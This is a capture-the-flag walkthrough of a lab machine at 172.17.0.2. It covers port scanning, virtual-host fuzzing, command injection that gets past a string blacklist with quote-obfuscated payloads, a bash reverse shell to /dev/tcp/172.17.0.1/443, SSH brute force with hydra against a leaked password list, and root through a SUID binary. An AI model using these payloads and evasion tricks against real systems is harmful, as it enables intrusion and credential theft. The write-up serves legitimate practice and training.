# IP
172.17.0.2
# Reconnaissance

```sh
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.084 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.028 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1031ms
rtt min/avg/max/mdev = 0.028/0.056/0.084/0.028 ms
```
# Ports scanning

``` sh
sudo nmap -sS -sC -sV -p- --open -Pn -n --min-rate 5000 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-29 16:09 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 f9:66:aa:77:67:23:c3:15:5a:fb:3d:02:08:71:c7:9f (ECDSA)
|_  256 82:a2:e0:d9:84:da:39:bf:da:06:51:b8:3b:32:9a:60 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://internal.dl/
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 5E:B1:14:F8:D2:7D (Unknown)
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.81 seconds
```
# Web enumeration

``` sh
curl -s http://172.17.0.2/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>303 See Other</title>
</head><body>
<h1>See Other</h1>
<p>The answer to your request is located <a href="http://internal.dl/">here</a>.</p>
<hr>
<address>Apache/2.4.58 (Ubuntu) Server at 172.17.0.2 Port 80</address>
</body></html>
```

```sh
cat /etc/hosts | grep internal
172.17.0.2      internal.dl
```
## Subdomains fuzzing

``` sh
gobuster vhost -u http://internal.dl/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --xs 303
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://internal.dl/
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
backup.internal.dl Status: 200 [Size: 22554]
Progress: 4989 / 4989 (100.00%)
===============================================================
Finished
===============================================================
```

``` sh
cat /etc/hosts | grep backup.internal.dl
172.17.0.2      backup.internal.dl
```
# WAF bypass

![[Pasted image 20260929170245.png]]

The subdomain found has a interactive directory inspector
When trying to inject bash commands it blocks the command due to a suspicious operator

When typing a single ' it gives the following error:
✗ Network error: can't access property "replace", s is null

When typing an injection it gives the following error:
✗ Blacklist: Dangerous command detected in path.

The WAF is using a blacklist using exact strings

**Payload**
``` 
/home | \whoam\i
root@sysvault:~# ls -lah /home | \whoam\i ok www-data
```
# Reverse shell

``` 
/home | ba's'h -c 'bas''h -i >& /dev/tcp/172.17.0.1/443 0>&1'
```
# Privilege escalation
## SUID

``` sh
find / -perm -4000 2>/dev/null | grep vault
/usr/local/bin/vaultctl
```
## Leaked credentials

``` sh
cat /opt/.vault_pass.txt
X#9mK$vL2@pQ
nR7!wZ3&eT5*
Hy6@jP2#mX8$
qB4!nW9&kL3@
Vz8#cR5$xJ2!
mT3@bY7!pN6&
Kw5$hM2#fQ9@
eL8!vX4&nB6*
Rj2@cT7#wP5$
uN9&mK3!xZ4@
Fb6#yH8$qW2!
sG4@tL5&rJ9*
Dp7!kM3#bX6@
aC2$vN8!wQ5&
Xt9@eR4#hL7$
oW3&jB6!mT2#
Yk8$pZ5@cN4!
iH2#xQ9&fR7*
Mn5!bL3$vW8@
Gq4@tX7#eK2&
```
## Hydra

``` sh
hydra -l vault -P passwords.txt ssh://172.17.0.2
[22][ssh] host: 172.17.0.2   login: vault   password: Yk8$pZ5@cN4!
```
# Privilege escalation

``` sh
/usr/local/bin/vaultctl
whoami
root
```